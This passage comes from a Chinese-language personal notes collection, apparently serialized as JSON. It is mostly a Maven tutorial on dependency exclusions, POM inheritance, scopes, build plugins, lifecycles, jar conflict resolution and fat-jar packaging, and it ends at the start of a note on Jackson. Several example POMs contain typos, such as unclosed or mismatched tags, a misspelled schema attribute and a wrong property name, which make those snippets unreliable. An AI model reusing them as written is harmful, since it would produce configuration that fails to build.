B的optional设置成true。此时proejct A, project B就不会出现传递依赖。如果project D需要使用project A与project B，则在project D中显式引入即可\n\n**exclusions标签**\n如果 Project C 引入的依赖没有加 <optional>true</optional>，Project D 又需要依赖 Project C，但只用到 Project A 的类怎么办呢？Maven 也是有解决办法的，使用 exclusion 关键字，不多说，上一段代码就懂了:\n```xml\n<dependencies>\n    <dependency>\n      <groupId>top.dayarch.demo</groupId>\n      <artifactId>Project-C</artifactId>\n      <exclusions>\n        <exclusion>\n          <groupId>top.dayarch.demo</groupId>\n          <artifactId>Project-B</artifactId>\n        </exclusion>\n      </exclusions> \n    </dependency>\n</dependencies>\n```\n\n### 继承相关标签\nmaven中继承有两个作用：\n- 子项目继承父项目中导入的依赖, 例如我们有一个父项目maven-parent，该父项目拥有一个子项目A，如果在父项目中依赖了junit，那么在子项目A中即便是没有引入junit，在子项目中仍然能够使用junit，因为子项目继承了父项目中的junit依赖\n- “一处声明、多出使用”，例如子项目会继承父项目中的`<groupId>`、`<version>`等标签，因此表示子项目坐标时只需要写`<artifactId>`标签\n\n在构建多个模块的时候，往往会多有模块有相同的groupId、version，或者有相同的依赖，例如：spring-core、spring-beans、spring-context和junit等，或者有相同的组件配置，例如：maven-compiler-plugin和maven-resources-plugin配置，在Maven中也有类似Java的继承机制，那就是POM的继承。\n继承POM的用法\n面向对象设计中，程序员可以通过一种类的父子结构，在父类中声明一些字段和方法供子类继承，这样可以做到“一处声明、多处使用”，类似的我们需要创建POM的父子结构，然后在父POM中声明一些配置，供子POM继承。\n下面声明一个父POM，如下：\n```xml\n<project\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:shemaLocation=\"http://maven.apache.org/POM/4.0.0\nhttp://maven.apache.org/maven-v4_0_0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n    <groupId>com.juvenxu.mvnbook.account</groupId>\n    <artifactId>account-parent</artifactId>\n    <version>1.0.0-SNAPSHOT</version>\n    <packaging>pom</packaging>\n    <name>Account Parent</name>\n</project>\n```\n这个父POM中，groupId和version和其它模块一样，它的packaging为pom，这一点和聚合模块一样，==作为父模块的POM，其打包类型也必须为pom==,由于父模块只是为了帮助消除配置的重复，因此它本身不包含除POM之外的项目文件，也就不需要src/main/java之类的文件夹了。\n有了父模块，就需要其它模块来继承它。首先将account-email的POM修改如下：\naccount-email继承account-parent的POM\n```xml\n<project\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:shemaLocation=\"http://maven.apache.org/POM/4.0.0\nhttp://maven.apache.org/maven-v4_0_0.xsd\">\n    <parent>\n        <groupId>com.juvenxu.mvnbook.account<groupId>\n        <artifactId>account-parent</artifactId>\n        <version>1.0.0-SNAPSHOT</version>\n        <relativePath>../account-parent/pom.xml</relativePath>\n    </parent>\n    \n    <artifactId>account-email</artifactId>\n    <name>Account Email</name>\n    \n    <dependencies>\n        ....\n    </dependencies>\n    <build>\n        <plugins>\n            ....\n        </plugins>\n    </build>\n</project>\n```\n- 上面POM中使用parent元素声明父模块，==paren下的子元素groupId、artifactId和version指定了父模块的坐标，这三个元素是必须的==。元素relativePath表示了父模块POM的相对位置。当项目构建时，Maven会首先根据relativePath检查父POM，如果找不到，再从本地仓库查找。relativePath的默认值是../pom.xml,Maven默认父POM在上一层目录下。\n- 上面POM没有为account-email声明groupId，version,不过并不代表account-email没有groupId和version，实际上，这个子模块隐式的从父模块继承了这两个元素，这也就消除了不必要的配置。上例中，父子模块使用了相同的groupId和version，如果遇到子模块需要使用和父模块不一样的groupId或者version的情况，可以在子模块中显式声明。对于artifactId元素来说，子模块更应该显式声明，因为如果完全继承groupId、artifactId、version,会造成坐标冲突；另一方面，即使使用不同的groupId或version,同样的artifactId容易造成混淆。\naccount-persist继承account-parent的POM\n```xml\n<project\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:shemaLocation=\"http://maven.apache.org/POM/4.0.0\nhttp://maven.apache.org/maven-v4_0_0.xsd\">\n    <parent>\n        <groupId>com.juvenxu.mvnbook.account<groupId>\n        <artifactId>account-parent</artifactId>\n        <version>1.0.0-SNAPSHOT</version>\n        <relativePath>../account-parent/pom.xml</relativePath>\n    </parent\n    \n    <artifactId>account-persist</artifactId>\n    <name>Account Persist</name>\n    \n    <dependencies>\n        ....\n    </dependencies>\n    <build>\n        ...\n    </build>\n</project>\n```\n最后，同样需要把account-parent加入到聚合模块accountp-aggregator中，代码如下：\n将account-parent加入到聚合模块\n```xml\n<project\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\n        http://maven.apache.org/maven-v4_0_0.xsd\">\n        <modelVersion>4.0.0</modelVersion>\n        <groupId>com.juvenxu.mvnbook.account</groupId>\n        <artifact>account-aggregator</artifact>\n        <version>1.0.0-SNAPSHOT</version>\n        <packaging>pom</packaging>\n        <name>Account Aggregator</name>\n        <modules>\n            <module>account-email</module>\n            <module>account-persist</module>\n            <module>account-parent</module>\n        </modules>\n</project>\n```\n\n#### relativePath标签\nrelativePath标签是parent的子标签，需要搭配parent标签使用。\n\n```xml\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.1.9.RELEASE</version>\n    <relativePath/>\n</parent>\n```\nrelativePath标签的作用:\n- 指定查找该父项目pom.xml的(相对)路径。默认顺序：relativePath > 本地仓库 > 远程仓库\n- 没有relativePath标签等同`<relativePath>../pom.xml</relativePath>`, 即默认从当前pom文件的上一级目录找\n- `<relativePath/>`表示不从relativePath找, 直接从本地仓库找,找不到再从远程仓库找\n\n### Scope标签\nscope标签，他有自己的生存空间，他只能生活在<dependency>标签范围内，想去其他地方，不好意思，去不了。\n\nScope依赖作用域也可称作依赖范围：maven中的依赖，会根据程序所处的阶段和场景发生变化，所以maven用scope 属性来做限制；\n1. compile（默认值）：在编译、运行、测试、打包都有效；\n2. provided：编译、测试时有效，运行、打包无效；\n3. test：仅在测试时有效；\n4. runtime：测试、运行、打包时有效；\n5. system：不推荐使用，使用system作用域不会去本地仓库寻找依赖，要指定本地路径；\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408235007.png)\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n</dependency>\n```\n\n#### 使用import scope解决maven继承（单）问题\n想必大家在做SpringBoot应用的时候，都会有如下代码：\n```xml\n<parent>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-starter-parent</artifactId>\n\t<version>1.3.3.RELEASE</version>\n</parent>\n```\n继承一个父模块，然后再引入相应的依赖\n假如说，我不想继承，或者我想继承多个，怎么做？\n我们知道Maven的继承和Java的继承一样，是无法实现多重继承的，如果10个、20个甚至更多模块继承自同一个模块，那么按照我们之前的做法，这个父模块的dependencyManagement会包含大量的依赖。如果你想把这些依赖分类以更清晰的管理，那就不可能了，import scope依赖能解决这个问题。你可以把dependencyManagement放到单独的专门用来管理依赖的pom中，然后在需要使用依赖的模块中通过import scope依赖，就可以引入dependencyManagement。例如可以写这样一个用于依赖管理的pom：\n```xml\n<project>\n\t<modelVersion>4.0.0</modelVersion>\n\t<groupId>com.test.sample</groupId>\n\t<artifactId>base-parent1</artifactId>\n\t<packaging>pom</packaging>\n\t<version>1.0.0-SNAPSHOT</version>\n\t<dependencyManagement>\n\t\t<dependencies>\n\t\t\t<dependency>\n\t\t\t\t<groupId>junit</groupId>\n\t\t\t\t<artifactid>junit</artifactId>\n\t\t\t\t<version>4.8.2</version>\n\t\t\t</dependency>\n\t\t\t<dependency>\n\t\t\t\t<groupId>log4j</groupId>\n\t\t\t\t<artifactid>log4j</artifactId>\n\t\t\t\t<version>1.2.16</version>\n\t\t\t</dependency>\n\t\t</dependencies>\n\t</dependencyManagement>\n</project>\n```\n然后其他模块就可以在中通过非继承的方式来引入这段依赖管理配置\n```xml\n<dependencyManagement>\n\t<dependencies>\n\t\t<dependency>\n\t\t\t<groupId>com.test.sample</groupId>\n\t\t\t<artifactid>base-parent1</artifactId>\n\t\t\t<version>1.0.0-SNAPSHOT</version>\n\t\t\t<type>pom</type>\n\t\t\t<scope>import</scope>\n\t\t</dependency>\n\t</dependencies>\n</dependencyManagement>\n \n<!-- 添加com.test.sample.base-parent1模块中dependencyManagement标签中声明了的依赖, 如:junit, log4j。其中版本号不需要，会自动继承 -->\n<dependency>\n\t<groupId>junit</groupId>\n\t<artifactid>junit</artifactId>\n</dependency>\n<dependency>\n\t<groupId>log4j</groupId>\n\t<artifactid>log4j</artifactId>\n</dependency>\n\n```\n**注意：import scope只能用在dependencyManagement里面**\n这样，父模块的pom就会非常干净，由专门的packaging为pom来管理依赖，也契合的面向对象设计中的单一职责原则。此外，我们还能够创建多个这样的依赖管理pom，以更细化的方式管理依赖。这种做法与面向对象设计中使用组合而非继承也有点相似的味道。\n\n### build、plugins标签\n### 作用\n- 使用maven构建的项目可以直接使用maven build完成项目的编译、测试、打包，无需额外配置。\n- build标签描述了如何编译及打包项目，具体的编译和打包工作是通过其中的plugin配置来实现的。当然，plugin不是必须的，即使不添加plugin标签，默认也会引入以下插件：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222145721.png)\n\n- 如果有需要可以另外进行配置,以下配置了编译时使用的jdk版本。\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222145749.png)\n\n### 分类\n在Maven的pom.xml文件中，存在如下两种`<build>`：\n- 全局配置（project build）: 针对整个项目的所有情况都有效\n- 配置（profile build）: 针对不同的profile配置\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"  \n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"  \n  xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\">  \n  ...  \n  <!-- \"Project Build\" contains elements of the BaseBuild set and the Build set-->  \n  <build>...</build>  \n   \n  <profiles>  \n    <profile>  \n      <!-- \"Profile Build\" contains elements of the BaseBuild set only -->  \n      <build>...</build>  \n    </profile>  \n  </profiles>  \n</project>\n```\n说明：\n- 一种<build>被称为Project Build，即是<project>的直接子元素。\n- 另一种<build>被称为Profile Build，即是<profile>的直接子元素。\nProfile Build包含了基本的build元素，而Project Build还包含两个特殊的元素，即各种<...Directory>和<extensions>。\n\n### 配置说明\n#### 基本元素\n示例如下\n```xml\n<build>  \n  <defaultGoal>install</defaultGoal>  \n  <directory>${basedir}/target</directory>  \n  <finalName>${artifactId}-${version}</finalName> \n  <filters>\n   <filter>filters/filter1.properties</filter>\n  </filters> \n  ...\n</build> \n```\n- defaultGoal: 指定执行build任务时，如果没有指定目标，将使用的默认目标。如上配置：在命令行中执行mvn，没有指定目标, 则相当于执行mvn install\n- directory: 指定build后产生的目标文件的存放目录，默认在${basedir}/target目录\n- finalName: 指定build后产生的目标文件的名称，默认情况为${artifactId}-${version}\n- filter: 定义*.properties文件，包含一个properties列表，该列表会应用到支持filter的resources中。也就是说，定义在filter的文件中的name=value键值对，会在build时代替${name}值应用到resources中。maven的默认filter文件夹为${basedir}/src/main/filters\n\n#### Resources配置\n用于包含或者排除某些资源文件\n```xml\n<build>  \n        ...  \n       <resources>  \n          <resource>  \n             <targetPath>META-INF/plexus</targetPath>  \n             <filtering>true</filtering>  \n            <directory>${basedir}/src/main/plexus</directory>  \n            <includes>  \n                <include>configuration.xml</include>  \n            </includes>  \n            <excludes>  \n                <exclude>**/*.properties</exclude>  \n            </excludes>  \n         </resource>  \n    </resources>  \n    <testResources>  \n        ...  \n    </testResources>  \n    ...  \n</build>\n```\n- resources: 一个resources元素的列表。每一个都描述与项目关联的文件是什么和在哪里\n- targetPath: 指定build后的resource存放的文件夹，默认是basedir。通常被打包在jar中的resources的目标路径是META-INF\n- filtering: true/false，表示为这个resource，filter是否激活\n- directory: 定义resource文件所在的文件夹，默认为${basedir}/src/main/resources\n- includes: 指定哪些文件将被匹配，以*作为通配符\n- excludes: 指定哪些文件将被忽略\n- testResources: 定义和resource类似，只不过在test时使用\n\n#### plugins配置\n用于指定使用的插件\n```xml\n<build>  \n    ...  \n    <plugins>  \n        <plugin>  \n            <groupId>org.apache.maven.plugins</groupId>  \n            <artifactId>maven-jar-plugin</artifactId>  \n            <version>2.0</version>  \n            <extensions>false</extensions>  \n            <inherited>true</inherited>  \n            <configuration>  \n                <classifier>test</classifier>  \n            </configuration>  \n            <dependencies>...</dependencies>  \n            <executions>...</executions>  \n        </plugin>  \n    </plugins>  \n</build>  \n```\n\n#### pluginManagement配置\npluginManagement的配置和plugins的配置是一样的，只是用于继承，使得可以在孩子pom中使用。\n\n父pom：\n```xml\n<build>  \n    ...  \n    <pluginManagement>  \n        <plugins>  \n            <plugin>  \n              <groupId>org.apache.maven.plugins</groupId>  \n              <artifactId>maven-jar-plugin</artifactId>  \n              <version>2.2</version>  \n                <executions>  \n                    <execution>  \n                        <id>pre-process-classes</id>  \n                        <phase>compile</phase>  \n                        <goals>  \n                            <goal>jar</goal>  \n                        </goals>  \n                        <configuration>  \n                            <classifier>pre-process</classifier>  \n                        </configuration>  \n                    </execution>  \n                </executions>  \n            </plugin>  \n        </plugins>  \n    </pluginManagement>  \n    ...  \n</build>\n```\n\n则在子pom中，我们只需要配置：\n```xml\n<build>  \n    ...  \n    <plugins>  \n        <plugin>  \n            <groupId>org.apache.maven.plugins</groupId>  \n            <artifactId>maven-jar-plugin</artifactId>  \n        </plugin>  \n    </plugins>  \n    ...  \n</build>  \n```\n这样大大简化了孩子pom的配置\n\n# Maven中常见命令\n1. clean：清理编译后的目录，即target目录\n2. complie: 编译，只编译main下的java目录与resource目录，不编译test目录与webapp目录\n3. test-complie: 编译main与test目录中的代码\n4. test: 运行test里边的代码\n5. package: 将项目打包,包括webapp目录，打包的名字为该项目的artifactId+version+packaging\n6. install: 发布项目到本地仓库，多用在打jar包上，打成jar包后可以被其他项目使用\n7. tomcat: run： 一键构建项目，即把项目放在tomcat上\n8. site: maven将项目生成静态描述文件html形式，执行完该命令后可在target目录下找到生成的site目录\n\n# 生命周期\n## 什么是 Maven 的生命周期？\nMaven 生命周期定义了各个构建环节的执行顺序，有了这个清单，Maven 就可以自动化的执行构建命令了。\n\nMaven 有三套相互独立的生命周期，分别是：\n- Clean Lifecycle 在进行真正的构建之前进行一些清理工作\n- Default Lifecycle 构建的核心部分，编译，测试，打包，安装，部署等等\n- Site Lifecycle 生成项目报告，站点，发布站点\n它们是相互独立的，你可以仅仅调用 clean 来清理工作目录，仅仅调用 site 来生成站点。当然你也可以直接运行 mvn clean install site 运行所有这三套生命周期。 每套生命周期都由一组阶段(Phase)组成，我们平时在命令行输入的命令总会对应于一个特定的阶段。比如，运行 mvn clean，这个 clean 是 Clean 生命周期的一个阶段。有 Clean 生命周期，也有 clean 阶段。\n\n\n## Clean 生命周期\nClean 生命周期一共包含了三个阶段：\n- pre-clean 执行一些需要在 clean 之前完成的工作\n- clean 移除所有上一次构建生成的文件\n- post-clean 执行一些需要在 clean 之后立刻完成的工作\n\n\n## Site 生命周期\n- pre-site 执行一些需要在生成站点文档之前完成的工作\n- site 生成项目的站点文档\n- post-site 执行一些需要在生成站点文档之后完成的工作，并且为部署做准备\n- site-deploy 将生成的站点文档部署到特定的服务器上 这里经常用到的是 site 阶段和 site-deploy 阶段，用以生成和发布 Maven 站点，这可是 Maven 相当强大 的功能，Manager 比较喜欢，文档及统计数据自动生成，很好看。\n\n\n## Default 生命周期\nDefault 生命周期是 Maven 生命周期中最重要的一个，绝大部分工作都发生在这个生命周期中（列出一些重要阶段）\n\n- validate：验证工程是否正确，所有需要的资源是否可用。\n- compile：编译项目的源代码。\n- test：使用合适的单元测试框架来测试已编译的源代码。这些测试不需要已打包和布署。\n- package：把已编译的代码打包成可发布的格式，比如 jar、war 等。\n- integration-test：如有需要，将包处理和发布到一个能够进行集成测试的环境。\n- verify：运行所有检查，验证包是否有效且达到质量标准。\n- install：把包安装到maven本地仓库，可以被其他工程作为依赖来使用。\n- deploy：在集成或者发布环境下执行，将最终版本的包拷贝到远程的repository，使得其他的开发者或者工程可以共享\n\n\n## 生命周期与自动化构建\n运行任何一个阶段的时候，它前面的所有阶段都会被运行，例如我们运行 mvn install 的时候，代码会被编译，测试，打包。这就是 Maven 为什么能够自动执行构建过程的各个环节的原因。此外，Maven 的插件机制是完全依赖 Maven 的生命周期的，因此理解生命周期至关重要。\n\n\n# Maven的依赖传递、依赖冲突及解决方法\n## Maven中jar包冲突产生原因\nMAVEN项目运行中如果报如下错误：\n```\nCaused by:java.lang.NoSuchMethodError\nCaused by: java.lang.ClassNotFoundException\n```\n十有八九是Maven jar包冲突造成的。那么jar包冲突是如何产生的？\n\n首先我们需要了解jar包依赖的传递性。\n\n\n### 依赖传递\n\n当我们需要A的依赖的时候，就会在pom.xml中引入A的jar包；而引入的A的jar包中可能又依赖B的jar包，这样Maven在解析pom.xml的时候，会依次将A、B 的jar包全部都引入进来。\n\n举个例子：\n\n在Spring Boot应用中导入Hystrix和原生Guava的jar包：\n```xml\n<!--原生Guava API-->\n<dependency>\n\t<groupId>com.google.guava</groupId>\n\t<artifactId>guava</artifactId>\n\t<version>20.0</version>\n</dependency>\n\n<!--hystrix依赖（包含对Guava的依赖）-->\n<dependency>\n\t<groupId>org.springframework.cloud</groupId>\n\t<artifactId>spring-cloud-starter-netflix-hystrix</artifactId>\n\t<version>1.4.4.RELEASE</version>\n</dependency>\n```\n利用Maven Helper插件得到项目导入的jar包依赖树：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222142545.png)\n\n从图中可以看出Hystrix包含对Guava jar包依赖的引用： Hystrix -> Guava，所以在引入Hystrix的依赖的时候，会将Guava的依赖也引入进来。\n\n### jar包冲突原理\n那么jar包是如何产生冲突的？\n\n假设有如下依赖关系：\n```\nA->B->C->D1(log 15.0)：A中包含对B的依赖，B中包含对C的依赖，C中包含对D1的依赖，假设是D1是日志jar包，version为15.0\n```\n```\nE->F->D2(log 16.0)：E中包含对F的依赖，F包含对D2的依赖，假设是D2是同一个日志jar包，version为16.0\n```\n\n当pom.xml文件中引入A、E两个依赖后，根据Maven传递依赖的原则，D1、D2都会被引入，而D1、D2是同一个依赖D的不同版本。\n\n当我们在调用D2中的method1()方法，而D1中是15.0版本（method1可能是D升级后增加的方法），可能没有这个方法，这样JVM在加载A中D1依赖的时候，找不到method1方法，就会报NoSuchMethodError的错误，此时就产生了jar包冲突。\n\n注：如果在调用method2()方法的时候，D1、D2都含有这个方法（且升级的版本D2没有改动这个方法，这样即使D有多个版本，也不会产生版本冲突的问题。）\n\n举个例子：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222142802.png)\n\n利用Maven Helper插件分析得出：Guava这个依赖包产生冲突。我们之前导入了Guava的原生jar包，版本号是20.0；而现在提示Guava产生冲突，且冲突发生位置是Hystrix所在的jar包，所以可以猜测Hystrix中包含了对Guava不同版本的jar包的引用。\n\n为了验证我们的猜想，使用Maven Helper插件打印出Hystrix依赖的jar tree：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222142836.png)\n\n可以看到：Hystrix jar中所依赖的Guava jar包是15.0版本的，而我们之前在pom.xml中引入的原生Guava jar包是20.0版本的，这样Guava就有15.0 与20.0这两个版本，因此发生了jar包冲突。\n\n## Maven中jar包冲突的解决方案\nMaven 解析 pom.xml 文件时，同一个 jar 包只会保留一个，那么面对多个版本的jar包，需要怎么解决呢？\n\n### Maven默认处理策略\n- 最短路径优先: Maven 面对 D1 和 D2 时，会默认选择最短路径的那个 jar 包，即 D2。E->F->D2 比 A->B->C->D1 路径短 1。\n- 最先声明优先: 如果路径一样的话，如： A->B->C1, E->F->C2 ，两个依赖路径长度都是 2，那么就选择最先声明。\n\n### 移除依赖：用于排除某项依赖的依赖jar包\n（1）我们可以借助Maven Helper插件中的Dependency Analyzer分析冲突的jar包，然后在对应标红版本的jar包上面点击execlude，就可以将该jar包排除出去。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222143338.png)\n\n再刷新以后冲突就会消失。\n\n（2）手动排除\n或者手动在pom.xml中使用`<exclusion>`标签去排除冲突的jar包（上面利用插件Maven Helper中的execlude方法其实等同于该方法）：\n```xml\n<dependency>\n\t<groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-hystrix</artifactId>\n\t\t<version>1.4.4.RELEASE</version>\n\t\t<exclusions>\n\t\t\t<exclusion>\n\t\t\t\t<groupId>com.google.guava</groupId>\n\t\t\t\t<artifactId>guava</artifactId>\n\t\t\t</exclusion>\n\t</exclusions>\n</dependency>\n```\nmvn分析包冲突命令：\n```\nmvn dependency:tree\n```\n\n### 版本锁定原则：一般用在继承项目的父项目中\n\n正常项目都是多模块的项目，如moduleA和moduleB共同依赖X这个依赖的话，那么可以将X抽取出来，同时设置其版本号，这样X依赖在升级的时候，不需要分别对moduleA和moduleB模块中的依赖X进行升级，避免太多地方（moduleC、moduleD…）引用X依赖的时候忘记升级造成jar包冲突，这也是实际项目开发中比较常见的方法。\n\n首先定义一个父pom.xml，将公共依赖放在该pom.xml中进行声明：\n```xml\n<properties>\n    <spring.version>spring4.2.4</spring.version>\n<properties>\n\n<dependencyManagement>\n    <dependencies>\n\t\t<dependency>\n\t\t\t<groupId>org.springframework</groupId>\n\t\t\t<artifactId>spring-beans</artifactId>\n\t\t\t<version>${spring.versio}</version>\n\t\t</dependency>\n\t</dependencies>\n</dependencyManagement>\n```\n\n这样如moduleA和moduleB在引用Spring-beans jar包的时候，直接使用父pom.xml中定义的版本号就可以：\n\nmoduleA在其pom.xml使用spring-bean的jar包(不用再定义版本)：\n```xml\n<dependencies>\n\t<dependency>\n\t\t<groupId>org.springframework</groupId>\n\t\t<artifactId>spring-beans</artifactId>\n\t</dependency>\n</dependencies>\n```\nmoduleB在其pom.xml使用spring-bean的jar包如上类似：\n```xml\n<dependencies>\n\t<dependency>\n\t\t<groupId>org.springframework</groupId>\n\t\t<artifactId>spring-beans</artifactId>\n\t</dependency>\n</dependencies>\n```\n以上就是日常开发中解决Maven冲突的几个小方案，当然实际开发中jar包冲突的问题可能远远比这个更复杂，需要具体问题具体处理。\n\n# Maven项目之间的关系\n1. 依赖关系 pom.xml中的标签把另一个项目的jar引入到当前的项目中，并且自动下载另一个项目所依赖的其他项目\n2. 继承关系\n\t1. 父项目是pom类型\n\t2. 主要是为了消除重复配置\n\t3. 子项目是jar或war，如果子项目还是其他项目的父项目，则子项目也是pom类型\n\t4. 有继承关系后，子项目中的pom.xml中会出现标签，并且如果子项目中的和与父项目中的相同，则在子项目中可以不配置这标签\n\t5. 父项目pom.xml中是看不到有哪些子项目的，在逻辑上具有父子关系\n3. 聚合关系\n\t1. 主要是为了方便快速构建项目\n\t2. 具有聚合关系的父项目中的pom.xml中会有标签\n\t3. 聚合关系的项目是pom类型\n\t```xml\n    <modules>\n        <module>child</module>\n    </modules>\n\t```\n\n# 聚合与继承的关系\n多模块中的聚合与继承其实是两个概念，其目的是完全不同的，前者主要是为了方便快速构建项目，后者主要是为了消除重复配置。.\n对于聚合模块来说，它知道有哪些被聚合的模块，但那些被聚合的子模块不知道这个聚合模块的存在。\n对于继承关系的父POM来说，它不知道哪些子模块继承于它，但那些子模块都必须知道自己的父POM是什么。\n在现有的实际项目中，往往会发现一个POM即是聚合POM，又是父POM，这么做主要是为了方便。一般来说，融合使用聚合与继承也没什么问题，例如可以将account-aggretor和account-parent其POM如下：\n```xml\n<project xmlns=\"http://maven-apache.org/POM/4.0.0\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0\nhttp://maven.apache.org/maven-v4_0_0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n    <groupId>com.juvenxu.mvnbook.account</groupId>\n    <artifactId>account-parent</artifactId>\n    <version>1.0.0-SNAPSHOT</version>\n    <packaging>pom</packaging>\n    <name>Account Parent</name>\n    <modules>\n        <module>account-persist</module>\n    </modules>\n    <properties>\n        <springframework.version>2.5.6</springframework.version>\n        <junit.version>4.7</junit.version>\n    </properties>\n    <dependencyManagement>\n        <dependencies>\n\t\t\t\t\t...\n        </dependencies>\n    </dependencyManagement>\n    <build>\n        <pluginManagement>\n            <plugins>\n\t\t\t\t\t\t\t...\n            </plugins>\n        </pluginManagement>\n    </build\n</project>\n```\n可以看到POM的打包方式为pom,它包含了一个modules元素，表示用来聚合account-persist和account-email两个模块，它还包含了properties、dependencyManagement和pluginManagement元素供子模块继承。\n\n\n\n# Maven打jar包插件\n现在主流的打包工具有assembly与shade\nAssembly插件只能原样打包，将各种依赖库打包在一起。而如果在打包过程中要解决冲突，或者在打包过程中进行某些转换，如剔除License重复等，则需要借助于一个更强大的shade插件。\n***\n1. maven-assembly-plugin第一种方式\n```xml\n    1 \t      <!-- maven-assembly-plugin -->\n    2 \t      <!-- 打包方式：mvn package assembly:single  -->\n    3 \t      <plugin>\n    4 \t        <groupId>org.apache.maven.plugins</groupId>\n    5 \t        <artifactId>maven-assembly-plugin</artifactId>\n    6 \t        <version>2.5.5</version>\n    7 \t        <configuration>\n    8 \t          <archive>\n    9 \t            <manifest>\n   10 \t              <mainClass>com.test.execute.Test</mainClass>\n   11 \t            </manifest>\n   12 \t          </archive>\n   13 \t          <descriptorRefs>\n   14 \t            <descriptorRef>jar-with-dependencies</descriptorRef>\n   15 \t          </descriptorRefs>\n   16 \t        </configuration>\n   17 \t      </plugin>\n```\n\n```shell\nD:\\Tools\\idea\\oa\\test\\target>java -jar test-jar-with-dependencies.jar\nHello World!\n```\n2. maven-assembly-plugin第二种方式\n```xml\n    1 \t      <!-- maven-assembly-plugin -->\n    2 \t      <!-- 打包方式：mvn package -->\n    3 \t      <plugin>\n    4 \t        <groupId>org.apache.maven.plugins</groupId>\n    5 \t        <artifactId>maven-assembly-plugin</artifactId>\n    6 \t        <version>2.5.5</version>\n    7 \t        <configuration>\n    8 \t          <archive>\n    9 \t            <manifest>\n   10 \t              <mainClass>com.test.execute.Test</mainClass>\n   11 \t            </manifest>\n   12 \t          </archive>\n   13 \t          <descriptorRefs>\n   14 \t            <descriptorRef>jar-with-dependencies</descriptorRef>\n   15 \t          </descriptorRefs>\n   16 \t        </configuration>\n   17 \t        <executions>\n   18 \t          <execution>\n   19 \t            <id>make-assembly</id>\n   20 \t            <phase>package</phase>\n   21 \t            <goals>\n   22 \t              <goal>single</goal>\n   23 \t            </goals>\n   24 \t          </execution>\n   25 \t        </executions>\n   26 \t      </plugin>\n```\n```shell\nD:\\Tools\\idea\\oa\\test\\target>java -jar test-jar-with-dependencies.jar\nHello World!\n```\n\n3. maven-shade-plugin\n```xml\n    1 \t      <!-- maven-shade-plugin -->\n    2 \t      <!-- 打包方式：mvn package -->\n    3 \t      <plugin>\n    4 \t        <groupId>org.apache.maven.plugins</groupId>\n    5 \t        <artifactId>maven-shade-plugin</artifactId>\n    6 \t        <version>2.4.1</version>\n    7 \t        <executions>\n    8 \t          <execution>\n    9 \t            <phase>package</phase>\n   10 \t            <goals>\n   11 \t              <goal>shade</goal>\n   12 \t            </goals>\n   13 \t            <configuration>\n   14 \t              <transformers>\n   15 \t                <transformer implementation=\"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\">\n   16 \t                  <mainClass>com.test.execute.Test</mainClass>\n   17 \t                </transformer>\n   18 \t              </transformers>\n   19 \t            </configuration>\n   20 \t          </execution>\n   21 \t        </executions>\n   22 \t      </plugin>\n```\n```shell\nD:\\Tools\\idea\\oa\\test\\target>java -jar test.jar\nHello World!\nD:\\Tools\\idea\\oa\\test\\target>java -jar test-1.0-SNAPSHOT-shaded.jar\nHello World!\n```\n<font color=\"red\">注</font>：<mainClass>指定的类为使用java -jar  *.jar 时，默认使用的main类，如果你在使用jar包时，传入相应的类的全限定名称，那么使用的是这个类\n例如：D:\\Tools\\idea\\oa\\test\\target>java -jar test-1.0-SNAPSHOT-shaded.jar com.Nais.hdfs.WordCountDriver\n那么会调用test-1.0-SNAPSHOT-shaded.jar中的com.Nais.hdfs.WordCountDriver的main方法\n"
  },
  {
    "title": "./notes/back-end/jackson.md",
    "body": "Jackson可以轻松的将Java对象转换成json对象和xml文档，同样也可以将json、xml转换成Java对象\nmaven 安装\n```xml\n<dependency>\n  <groupId>com.fasterxml.jackson.core</groupId>\n  <artifactId>jackson-core</artifactId>\n  <version>2.9.6</version>\n</dependency>\n\n<dependency>\n  <groupId>com.fasterxml.jackson.core</groupId>\n  <artifactId>jackson-annotations</artifactId>\n  <version>2.9.6</version>\n</dependency>\n\n<dependency>\n  <groupId>com.fasterxml.jackson.core</groupId>\n  <artifactId>jackson-databind</artifactId>\n  <version>2.9.6</version>\n</dependency>\n```\n# ObjectMapper\nObjectMapper类是Jackson库的主要类。它称为ObjectMapper的原因是因为它将JSON映射到Java对象（反序列化），或将Java对象映射到JSON（序列化）。它使用JsonParser和JsonGenerator的实例实现JSON实际的读/写。\n\n## 获取ObjectMapper对象的几种方法\n1. 通过JsonParser类中的getCodec()方法：\n```java\nObjectMapper mapper = (ObjectMapper) p.getCodec();\n```\n\n2. 直接new ObjectMapper();\n\n\n**ObjectMapper如何将JSON字段与Java字段匹配的三种方式**\n1. Jackson通过将JSON字段的名称与Java对象中的getter和setter方法相匹配，将JSON对象的字段映射到Java对象中的字段。Jackson删除了getter和setter方法名称的“get”和“set”部分，并将剩余名称的第一个字符转换为小写。\n2. Jackson还可以通过java反射进行匹配\n3. 通过注解或者其它方式进行自定义的序列化和反序列化程序。\n\n## 